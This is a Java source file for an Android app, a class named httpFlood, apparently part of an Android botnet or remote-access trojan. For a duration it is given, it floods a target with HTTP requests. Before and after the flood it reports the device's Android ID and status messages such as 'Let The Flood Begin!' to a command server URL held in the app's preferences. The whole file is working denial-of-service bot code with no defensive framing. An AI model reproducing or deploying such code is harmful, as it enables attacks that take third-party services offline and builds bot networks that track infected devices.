package com.asynctask;

import android.content.Context;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import com.utils.HttpFloodUtils;

import java.io.UnsupportedEncodingException;
import java.util.concurrent.TimeUnit;

import com.utils.NetWorkUtils;

/**
 * Created by Conan0xff on 2017/11/22.
 */

public class httpFlood extends AsyncTask<String, Void, String> {
    Context mContext;
    String i = "";//i 表示目标串
    String j = "";//
    String URL="127.0.0.1";

    public httpFlood(Context context,String i, String j) {
        this.mContext=context;
        this.i = i;
        this.j = j;
    }

    @Override
    protected String doInBackground(String... params) {
        //System.nanoTime毫微秒数,返回最准确的可用系统计时器的当前值，以毫微秒为单位,此方法只能用于测量已过的时间，与系统或钟表时间的其他任何时间概念无关。
        for (long stop = System.nanoTime() + TimeUnit.MILLISECONDS.toNanos(Integer.parseInt(j)); stop > System.nanoTime(); ) {
            HttpFloodUtils.rawHttpFlood(i);
        }
        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
        try {
            NetWorkUtils.getInputStreamFromUrl(mContext,URL + PreferenceManager.getDefaultSharedPreferences(mContext).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(mContext).getString("AndroidID", "") + "&Data=", "Let The Flood Begin!");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onPreExecute() {
        try {
            NetWorkUtils.getInputStreamFromUrl(mContext,URL + PreferenceManager.getDefaultSharedPreferences(mContext).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(mContext).getString("AndroidID", "") + "&Data=", "Starting HTTP Flood");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
